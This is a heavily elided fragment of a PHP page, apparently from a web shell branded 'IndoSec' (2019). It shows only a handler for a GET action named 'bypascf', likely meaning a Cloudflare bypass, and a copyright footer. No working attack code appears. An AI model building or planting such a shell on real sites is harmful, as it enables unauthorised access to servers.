...
<html>
	...
	*/
	...
	if ($_GET['aksi'] == 'bypascf') {
		...
		echo '</table></div><hr/><p style="opacity: 0.3;"><a href="https://facebook.com/IndoSecOfficial" style="color: white;">Copyright 2019 { IndoSec }</a></p></center><br/>';	
